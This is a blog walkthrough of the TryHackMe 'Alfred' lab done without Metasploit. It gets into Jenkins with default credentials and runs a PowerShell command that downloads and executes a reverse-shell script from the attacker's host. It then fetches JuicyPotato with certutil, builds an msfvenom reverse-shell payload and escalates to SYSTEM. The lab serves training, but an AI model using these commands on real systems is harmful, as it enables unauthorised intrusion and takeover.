---
layout: post
title: "TryHackMe - Alfred walkthrough without metasploit"
---

# Intro

Just to get things clear, I am a total noob so take the information provided with a generous pinch of salt.

This post is meant for documentation purposes and I wanted to share it because most of the walkthroughs online follow the intended way of using metasploit(meterpreter). While I think that metasploit is a powerful tool, I wanted to find a solution without using it because I thought it would be an interesting learning experience.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687792699119/afd6c737-6ecc-4256-aa15-8696fc5b792a.png)

# Recon

```bash
nmap -sCV -Pn $TARGET_IP
```

A standard `nmap` scan shows that there are 3 TCP ports open: 80, 3389, 8080. `-Pn` is added to save some time on the scan because it is save to assume the challenge machine is always up when you scan it.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687793834467/39355145-267d-4495-aa7e-f164406248e3.png )

When navigating to the site at `http://$IP:8080` we encounter a Jenkins login page, a successful login attempt is achieved by inputting default admin credentials `admin:admin`. Although this might seem intentional, you might be surprised how many admin portals have default credentials in the wild.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687793891567/2eeb4b1b-2c32-4e09-80c3-4667141e43f1.png )

We are greeted with the Jenkins dashboard once we are logged in

Navigate to `project` &gt; `Configure`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687794300609/e119cf7f-5bc2-412d-8be1-794ba958054c.png )

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687794476709/dc1f54b3-b28e-4a53-93dd-7d9fcd8e99b9.png )

Windows batch commands can be executed under the `Build` section.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687771956497/105575e5-f209-4f0b-9044-f90a4a856faa.png )

The room provides you with the PowerShell command to get a reverse shell on the target, replace the command and click `Save`.

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687794609689/d1688510-1162-4785-ba26-3e6aed0b215b.png )

The first part of the command will serve a [reverse shell script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) to the target, you must first host an HTTP server with `python3 -m http.server $PORT` on your machine, replace the IP and port in the PowerShell command accordingly.

In case you are using OpenVPN to connect to the challenge, your IP is under `tun0` when you use `ip addr ls`. Otherwise, it would be listed in the format of `root@$IP` in your terminal when using the attack box provided by TryHackMe.

The second part of the command separated by `;` starts the reverse shell script you just uploaded. On your machine set up a listener with `nc -nlvp $PORT`.

You should be able to obtain a PowerShell with your `nc` listener once you press `Build Now`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687794730988/ecdf58c6-b241-4d96-8133-aeb829973e06.png )

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687794785108/ed33ce31-1267-4867-8262-bff85b204320.png )

# Privilege Escalation

`whoami /priv` reveals that `SeDebugPrivilege, SeImpersonatePrivilege` are enabled which could allow for a token impersonation attempt.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687794913762/ccc4da1b-c100-4201-aab1-51f37169fd3a.png )

`systeminfo` reviews that the target is running x64 Windows 7 which will enable us to use [JuicyPotato](https://github.com/ohpe/juicy-potato) to perform privilege escalation. This [article](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505) explains the concept quite well, give it a read to learn more about the escalation method.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687795029150/2e4560cf-5ce6-43d9-9aa5-628d14906a30.png )

Serve the JuicyPotato 64-bit executable to the target by using the same method of hosting a python3 server on our machine. This time, use `certutil -urlcache -f http://$YOUR_IP:$YOUR_PORT/jp.exe jp.exe` in the PowerShell we obtained with our listener to transfer the executable.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687795166919/fa9b3521-802b-4d6b-bbdf-5f3c280823a3.png )

One more step is required before spawning a privileged shell on our machine. There are many ways to connect back with JuicyPotato such as using `netcat`(the binary is served to the target using the same method as JuicyPotato). Here I opted for the TCP reverse shell generated by `msfvenom`. I did not bother with encoding as this is a beginner-level room, if not then `shikata_ga_nai` should do the trick "most" of the time.

```bash
 msfvenom -p windows/x64/shell_reverse_tcp lhost=$IP lport=$PORT -f exe > rev.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687795405828/981b3023-e632-4f19-9557-43a2fdb8b5f5.png )

To execute the privilege escalation, check that the target has both the JuicyPotato and the `msfvenom` reverse shell executable and set up another listener with `nc` on the port used in generating the reverse shell with `msfvenom`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687795372399/30856d45-7c87-408a-a310-5b05651a18f3.png )

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687795429361/d829a3d3-009f-4c79-8fee-5336705c3797.png )

Finally, execute the PowerShell command.

```powershell
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p rev.exe -t *
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687795479847/ef2dfe13-f2c2-487b-95fd-35f90ae0e997.png )

With the privileged shell, navigate to `C:\Windows\System32\config` to obtain the root flag and complete the room.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687795814991/9b821ff0-a1db-442a-9c25-e9b809a4967c.png )

# Detours (Not part of the walkthrough)

I will share what I tried and failed in this section. Due to my skill level, most of the conclusions made will likely be wrong. Feel free to point me in the right direction so I can learn more about the topic.

## GodPotato

After looking through the [GodPotato](https://github.com/BeichenDream/GodPotato) GitHub page, I assumed that the tool has some level of dependency on the target's .NET framework version. A quick ChatGPT tour gave me a PowerShell command to check for the version on the target.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687833168842/02803bab-406a-4b4e-a1c7-2549614d88e8.png )

During my trial and error phase, I loaded both the NET2 and NET35 executables to the target and got similar results.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687833264053/c23e8f81-06b1-46d0-bf8f-c26b0188363b.png )

After further research on the nature of the exploit, I suspect that it has something to do with how the challenge machine was set up. As far as I know, the potato family of exploits relies on tricking the `NT AUTHORITY\SYSTEM` account into authenticating via NTLM. This was as far as I could go in terms of finding out why the tool did not work for this machine as I have reached the limit of my understanding on the topic. However, I suspect that there might be methods to check for compatibility with this tool similar to that of the .NET framework version check above. My guess is something along the lines of checking whether the service required for this exploit is running on the target machine.

## PrintSpoofer

During the recon phase, we concluded that the target machine is running x64 Windows 7 so I served the 64-bit version of the [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) executable onto the target machine.

For consistency's sake with the demo from the GitHub page I connected back to my machine with `cmd` using a `netcat` binary which I served to the target.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687835030267/b0f5fed7-e03d-4436-8deb-99a1ca9b92dd.png )

This method proved to be uneventful as I could not even invoke the `-h` help command with the executable.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687835176666/2d50791c-403a-4e16-a53d-98fde09c7fae.png )

Just for the sake of it, I also tried with the 32-bit executable.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687835353603/697c5199-f382-4320-b079-1931a130ecf1.png )
